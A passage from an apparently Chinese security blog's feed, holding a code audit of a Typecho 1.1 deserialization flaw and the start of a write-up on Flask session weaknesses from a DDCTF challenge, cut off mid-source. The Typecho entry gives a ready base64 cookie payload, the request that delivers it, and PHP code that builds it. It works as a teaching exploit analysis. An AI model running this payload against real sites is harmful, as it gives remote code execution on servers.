src="https://s2.ax1x.com/2019/05/18/EXV0Bt.jpg" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;JSON-Web-Token&quot;&gt;&lt;a href=&quot;#JSON-Web-Token&quot; class=&quot;headerlink&quot; title=&quot;JSON Web Token&quot;&gt;&lt;/a&gt;JSON Web Token&lt;/h2&gt;&lt;p&gt;一些Web应用程序使用JSON Web令牌即
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>typecho V1.1代码审计-反序列化漏洞</title>
    <link href="http://yoursite.com/2019/05/14/typecho/"/>
    <id>http://yoursite.com/2019/05/14/typecho/</id>
    <published>2019-05-14T11:42:00.766Z</published>
    <updated>2019-05-15T11:11:42.982Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-typecho简介"><a href="#0x01-typecho简介" class="headerlink" title="0x01 typecho简介"></a>0x01 typecho简介</h3><p>Typecho是一个简单，轻巧的博客程序。基于PHP，使用多种数据库（Mysql，PostgreSQL，SQLite）储存数据。</p><p>typecho V1.1存在反序列化漏洞，可以造成前台任意代码执行，也就是getshell</p><p>下载地址:<a href="http://typecho.org/download" target="_blank" rel="noopener">http://typecho.org/download</a></p><h3 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h3><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/build/install.php?finish</span><br></pre></td></tr></table></figure></p><p>POST:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookie: __typecho_config=YTo3OntzOjQ6Imhvc3QiO3M6OToibG9jYWxob3N0IjtzOjQ6InVzZXIiO3M6NjoieHh4eHh4IjtzOjc6ImNoYXJzZXQiO3M6NDoidXRmOCI7czo0OiJwb3J0IjtzOjQ6IjMzMDYiO3M6ODoiZGF0YWJhc2UiO3M6NzoidHlwZWNobyI7czo3OiJhZGFwdGVyIjtPOjEyOiJUeXBlY2hvX0ZlZWQiOjM6e3M6MTk6IgBUeXBlY2hvX0ZlZWQAX3R5cGUiO3M6NzoiUlNTIDIuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo0OiJsaW5rIjtzOjE6IjEiO3M6NToidGl0bGUiO3M6MToiMiI7czo0OiJkYXRlIjtpOjE1MDc3MjAyOTg7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fXM6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fX19fXM6MTA6ImRhdGVGb3JtYXQiO047fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9</span><br><span class="line">Referer: http://127.0.0.1/build/install.php</span><br></pre></td></tr></table></figure></p><p>效果如图:<br><img src="https://s2.ax1x.com/2019/05/15/EovCQI.jpg" alt="image"></p><h3 id="0x03-漏洞审计"><a href="#0x03-漏洞审计" class="headerlink" title="0x03 漏洞审计"></a>0x03 漏洞审计</h3><p>漏洞发生点在./install.php 第230行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># ./install.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    $config = unserialize(base64_decode(Typecho_Cookie::get(&apos;__typecho_config&apos;)));</span><br><span class="line">    Typecho_Cookie::delete(&apos;__typecho_config&apos;);</span><br><span class="line">    $db = new Typecho_Db($config[&apos;adapter&apos;], $config[&apos;prefix&apos;]);</span><br><span class="line">    $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">    Typecho_Db::set($db);</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure></p><p> 根据代码可知，$config的值是由变量__typecho_config经过base64解码和反序列化得到，这里跟进一下Typecho_Cookie类的get()函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># ./var/Typecho/Cookie.php</span><br><span class="line"></span><br><span class="line">public static function get($key, $default = NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        $key = self::$_prefix . $key;</span><br><span class="line">        $value = isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] : $default);</span><br><span class="line">        return is_array($value) ? $default : $value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可知变量__teypecho_config的值可以从Cookie的值传入，也可以从POST传入。</p><p>接下来是反序列化unserialize的利用思考了，要由对应的魔术方法配合，这里有几个关键魔术方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__destruct() // 在对象被销毁的时候自动调用</span><br><span class="line">__wakeup() // 在反序列化的时候自动调用</span><br><span class="line">__toString() // 在调用对象的时候自动调用</span><br></pre></td></tr></table></figure></p><p>继续审计，有代码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$db = new Typecho_Db($config[&apos;adapter&apos;], $config[&apos;prefix&apos;]);</span><br></pre></td></tr></table></figure></p><p>可知，这里对$config[‘adapter’]进行调用了，假设$config是一个数组的话，有如下代码(classA为一个可用的类)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$test = new classA();</span><br><span class="line">$config = array(</span><br><span class="line">    &apos;adapter&apos; =&gt; $test,</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><p>这样就完成了一个对象的调用了，所以用到__toString()函数，全局搜索一下，在var/Typecho/Feed.php 第284行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># var/Typecho/Feed.php</span><br><span class="line"></span><br><span class="line">foreach ($this-&gt;_items as $item) &#123;</span><br><span class="line">    $content .= &apos;&lt;item&gt;&apos; . self::EOL;</span><br><span class="line">    $content .= &apos;&lt;title&gt;&apos; . htmlspecialchars($item[&apos;title&apos;]) . &apos;&lt;/title&gt;&apos; . self::EOL;</span><br><span class="line">    $content .= &apos;&lt;link&gt;&apos; . $item[&apos;link&apos;] . &apos;&lt;/link&gt;&apos; . self::EOL;</span><br><span class="line">    $content .= &apos;&lt;guid&gt;&apos; . $item[&apos;link&apos;] . &apos;&lt;/guid&gt;&apos; . self::EOL;</span><br><span class="line">    $content .= &apos;&lt;pubDate&gt;&apos; . $this-&gt;dateFormat($item[&apos;date&apos;]) . &apos;&lt;/pubDate&gt;&apos; . self::EOL;</span><br><span class="line">    $content .= &apos;&lt;dc:creator&gt;&apos; . htmlspecialchars($item[&apos;author&apos;]-&gt;screenName) . &apos;&lt;/dc:creator&gt;&apos; . self::EOL;</span><br></pre></td></tr></table></figure><p>这里调用了<br>$item[‘author’]-&gt;screenName ，注意有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private $_items = array();</span><br></pre></td></tr></table></figure><p>说明$_items是当前类的私有变量，所以需要关注一个魔法变量__get(),它会在读取不可访问的属性的值的时候调用，所以 $item[‘author’]-&gt;screenName的调用显然是使用了这个魔法函数，<br>全局搜索一下这个函数</p><p>/var/Typecho/Request.php 第269行有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __get($key)</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;get($key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再跟踪一下get()函数,第295行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public function get($key, $default = NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        switch (true) &#123;</span><br><span class="line">            case isset($this-&gt;_params[$key]):</span><br><span class="line">                $value = $this-&gt;_params[$key];</span><br><span class="line">                break;</span><br><span class="line">            case isset(self::$_httpParams[$key]):</span><br><span class="line">                $value = self::$_httpParams[$key];</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                $value = $default;</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $value = !is_array($value) &amp;&amp; strlen($value) &gt; 0 ? $value : $default;</span><br><span class="line">        return $this-&gt;_applyFilter($value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最后一行$value的值还要经过_applyFilter函数调用，跟踪一下这个函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">private function _applyFilter($value)</span><br><span class="line">   &#123;</span><br><span class="line">       if ($this-&gt;_filter) &#123;</span><br><span class="line">           foreach ($this-&gt;_filter as $filter) &#123;</span><br><span class="line">               $value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">               call_user_func($filter, $value);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           $this-&gt;_filter = array();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return $value;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>call_user_func()这个回调函数存在可利用漏洞,比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$filter= &apos;assert&apos;;</span><br><span class="line">$value = &apos;phpinfo()&apos;;</span><br><span class="line">call_user_func($filter, $value);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>我在is_array卡了一下，发现它这个最后取的是键值。。还以为是数组。。</p><p>最后构造序列化payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class Typecho_Request</span><br><span class="line">    &#123;</span><br><span class="line">        private $_params = array();</span><br><span class="line">        private $_filter = array();</span><br><span class="line"></span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;_params[&apos;screenName&apos;] = 1; // 执行的参数值</span><br><span class="line">            $this-&gt;_filter[0] = &apos;phpinfo&apos;; //filter执行的函数</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Typecho_Feed&#123;</span><br><span class="line">        const RSS2 = &apos;RSS 2.0&apos;; //进入toString内部判断条件</span><br><span class="line">        private $_items = array();</span><br><span class="line">        private $_type;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;_type = self::RSS2;</span><br><span class="line">            $_item[&apos;author&apos;] = new Typecho_Request(); //Feed.php文件中触发__get()方法使用的对象</span><br><span class="line">        $_item[&apos;category&apos;] = array(new Typecho_Request());//触发错误</span><br><span class="line">            $this-&gt;_items[0] = $_item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $exp = new Typecho_Feed();</span><br><span class="line">    $a = array(</span><br><span class="line">        &apos;adapter&apos;=&gt;$exp, // Db.php文件中触发__toString()使用的对象</span><br><span class="line">        &apos;prefix&apos; =&gt;&apos;typecho_&apos;</span><br><span class="line">    );</span><br><span class="line">    echo urlencode(base64_encode(serialize($a)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h3 id="0x04-几个问题"><a href="#0x04-几个问题" class="headerlink" title="0x04 几个问题"></a>0x04 几个问题</h3><p>进入install.php会先执行两个判断，注意要绕过这两个判断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//判断是否已经安装</span><br><span class="line">if (!isset($_GET[&apos;finish&apos;]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . &apos;/config.inc.php&apos;) &amp;&amp; empty($_SESSION[&apos;typecho&apos;])) &#123;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 挡掉可能的跨站请求</span><br><span class="line">if (!empty($_GET) || !empty($_POST)) &#123;</span><br><span class="line">    if (empty($_SERVER[&apos;HTTP_REFERER&apos;])) &#123;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $parts = parse_url($_SERVER[&apos;HTTP_REFERER&apos;]);</span><br><span class="line">if (!empty($parts[&apos;port&apos;])) &#123;</span><br><span class="line">        $parts[&apos;host&apos;] = &quot;&#123;$parts[&apos;host&apos;]&#125;:&#123;$parts[&apos;port&apos;]&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (empty($parts[&apos;host&apos;]) || $_SERVER[&apos;HTTP_HOST&apos;] != $parts[&apos;host&apos;]) &#123;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>get请求的时候带上finish参数</li><li>post需要HTTP_REFERER参数,且HTTP_REFERER必须是本站</li></ul><p>POC执行会导致Typecho触发异常，并且内部设置了Typecho_Exception异常类，触发异常以后Typecho会自动能捕捉到异常，并执行异常输出</p><p>install.php程序开头开启了ob_start(),该函数会将内部输出全部放入到缓冲区中，执行注入代码以后触发异常，导致ob_end_clean()执行，该函数会清空缓冲区。</p><p>解决方案：让程序强制退出，不执行Exception，这样原来的缓冲区内容就会输出出来。</p><p>在Feed.php中__toString方法中第293行，可以给item[‘category’]赋值上对象，让其用数组的方式遍历对象时触发错误，强制退出程序。</p><h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.在install.php的第230行，我们精心构造的poc被这里反序列化</span><br><span class="line">2.在install.php的第232行，程序调用了$config[&apos;adapter&apos;]，而$config[&apos;adapter&apos;]是我们精心构造的，具有利用点__toString()函数的类Typecho_Feed()的对象</span><br><span class="line">3.因为对象 $config[&apos;adapter&apos;]被调用，触发了__toString()函数</span><br><span class="line">4.而在__toString()函数里，程序调用了类Typecho_Feed()的私有变量$item[&apos;author&apos;]-&gt;screenName，而$item[&apos;author&apos;]-&gt;screenName是我们精心构造的，具有利用点__get()函数的类Typecho_Request的对象</span><br><span class="line">5.由于私有变量被调用，触发了__get()函数</span><br><span class="line">6.__get()中的get()函数调用了危险函数call_user_func()，导致任意命令执行</span><br></pre></td></tr></table></figure><p>相关文章：<a href="https://paper.seebug.org/424/" target="_blank" rel="noopener">https://paper.seebug.org/424/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-typecho简介&quot;&gt;&lt;a href=&quot;#0x01-typecho简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 typecho简介&quot;&gt;&lt;/a&gt;0x01 typecho简介&lt;/h3&gt;&lt;p&gt;Typecho是一个简单，轻巧的博客程序。基
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Python Web之flask session漏洞</title>
    <link href="http://yoursite.com/2019/05/11/flask%20session/"/>
    <id>http://yoursite.com/2019/05/11/flask%20session/</id>
    <published>2019-05-11T05:40:36.601Z</published>
    <updated>2019-05-13T02:39:40.775Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>上个月打了个DDCTF，遇到了python flask的题，还没好好做个总结理解，这里记录一下。</p><h3 id="0x02-Python-flask-session"><a href="#0x02-Python-flask-session" class="headerlink" title="0x02 Python flask session"></a>0x02 Python flask session</h3><p>flask是轻量级的web框架，所以它的session存储在客户端里，通过http消息头在cookie就可以看到，且对session只签名，缺少数据防篡改实现，容易存在安全漏洞。</p><p>关于flask session原理代码可以看这篇文章</p><p><a href="https://cizixs.com/2017/03/08/flask-insight-session/" target="_blank" rel="noopener">flask session机制原理</a></p><p>关于flask 客户端session安全可以看看p牛这篇文章</p><p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">flask 客户端session机制安全</a></p><p>p牛的解密脚本为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig = payload.rsplit(b&apos;.&apos;, 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b&apos;.&apos;, 1)</span><br><span class="line">    decompress = False</span><br><span class="line">    if payload.startswith(b&apos;.&apos;):</span><br><span class="line">        payload = payload[1:]</span><br><span class="line">        decompress = True</span><br><span class="line">    try:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception(&apos;Could not base64 decode the payload because of &apos;</span><br><span class="line">                         &apos;an exception&apos;)</span><br><span class="line">    if decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception(&apos;Could not zlib decompress the payload before &apos;</span><br><span class="line">                             &apos;decoding the payload&apos;)</span><br><span class="line">    return session_json_serializer.loads(payload)</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    print(decryption(sys.argv[1].encode()))</span><br></pre></td></tr></table></figure></p><p>通过脚本解密session，可以了解session中存储着哪些信息。然后通过其他漏洞获取用于签名认证的secret_key,进一步伪造任意用户身份，扩大攻击效果。</p><h3 id="0x03-实战"><a href="#0x03-实战" class="headerlink" title="0x03 实战"></a>0x03 实战</h3><p>ddctf flask题源码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line"># written in python 2.7</span><br><span class="line">__author__ = &apos;garzon&apos;</span><br><span class="line"></span><br><span class="line">from flask import Flask, session, request, Response</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = &apos;*********************&apos; # censored</span><br><span class="line">url_prefix = &apos;/d5af33f66147e857&apos;</span><br><span class="line"></span><br><span class="line">def FLAG():</span><br><span class="line">return &apos;FLAG_is_here_but_i_wont_show_you&apos;  # censored</span><br><span class="line"></span><br><span class="line">def trigger_event(event):</span><br><span class="line">session[&apos;log&apos;].append(event)</span><br><span class="line">if len(session[&apos;log&apos;]) &gt; 5: session[&apos;log&apos;] = session[&apos;log&apos;][-5:]</span><br><span class="line">if type(event) == type([]):</span><br><span class="line">request.event_queue += event</span><br><span class="line">else:</span><br><span class="line">request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line">def get_mid_str(haystack, prefix, postfix=None):</span><br><span class="line">haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">if postfix is not None:</span><br><span class="line">haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">return haystack</span><br><span class="line"></span><br><span class="line">class RollBackException: pass</span><br><span class="line"></span><br><span class="line">def execute_event_loop():</span><br><span class="line">valid_event_chars = set(&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&apos;)</span><br><span class="line">resp = None</span><br><span class="line">while len(request.event_queue) &gt; 0:</span><br><span class="line">event = request.event_queue[0] # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span><br><span class="line">request.event_queue = request.event_queue[1:]</span><br><span class="line">if not event.startswith((&apos;action:&apos;, &apos;func:&apos;)): continue</span><br><span class="line">for c in event:</span><br><span class="line">if c not in valid_event_chars: break</span><br><span class="line">else:</span><br><span class="line">is_action = event[0] == &apos;a&apos;</span><br><span class="line">action = get_mid_str(event, &apos;:&apos;, &apos;;&apos;)</span><br><span class="line">args = get_mid_str(event, action+&apos;;&apos;).split(&apos;#&apos;)</span><br><span class="line">try:</span><br><span class="line">event_handler = eval(action + (&apos;_handler&apos; if is_action else &apos;_function&apos;))</span><br><span class="line">ret_val = event_handler(args)</span><br><span class="line">except RollBackException:</span><br><span class="line">if resp is None: resp = &apos;&apos;</span><br><span class="line">resp += &apos;ERROR! All transactions have been cancelled. &lt;br /&gt;&apos;</span><br><span class="line">resp += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">session[&apos;num_items&apos;] = request.prev_session[&apos;num_items&apos;]</span><br><span class="line">session[&apos;points&apos;] = request.prev_session[&apos;points&apos;]</span><br><span class="line">break</span><br><span class="line">except Exception, e:</span><br><span class="line">if resp is None: resp = &apos;&apos;</span><br><span class="line">#resp += str(e) # only for debugging</span><br><span class="line">continue</span><br><span class="line">if ret_val is not None:</span><br><span class="line">if resp is None: resp = ret_val</span><br><span class="line">else: resp += ret_val</span><br><span class="line">if resp is None or resp == &apos;&apos;: resp = (&apos;404 NOT FOUND&apos;, 404)</span><br><span class="line">session.modified = True</span><br><span class="line">return resp</span><br><span class="line"></span><br><span class="line">@app.route(url_prefix+&apos;/&apos;)</span><br><span class="line">def entry_point():</span><br><span class="line">querystring = urllib.unquote(request.query_string)</span><br><span class="line">request.event_queue = []</span><br><span class="line">if querystring == &apos;&apos; or (not querystring.startswith(&apos;action:&apos;)) or len(querystring) &gt; 100:</span><br><span class="line">querystring = &apos;action:index;False#False&apos;</span><br><span class="line">if &apos;num_items&apos; not in session:</span><br><span class="line">session[&apos;num_items&apos;] = 0</span><br><span class="line">session[&apos;points&apos;] = 3</span><br><span class="line">session[&apos;log&apos;] = []</span><br><span class="line">request.prev_session = dict(session)</span><br><span class="line">trigger_event(querystring)</span><br><span class="line">return execute_event_loop()</span><br><span class="line"></span><br><span class="line"># handlers/functions below --------------------------------------</span><br><span class="line"></span><br><span class="line">def view_handler(args):</span><br><span class="line">page = args[0]</span><br><span class="line">html = &apos;&apos;</span><br><span class="line">html += &apos;[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;&apos;.format(session[&apos;num_items&apos;], session[&apos;points&apos;])</span><br><span class="line">if page == &apos;index&apos;:</span><br><span class="line">html += &apos;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">html += &apos;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">html += &apos;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br 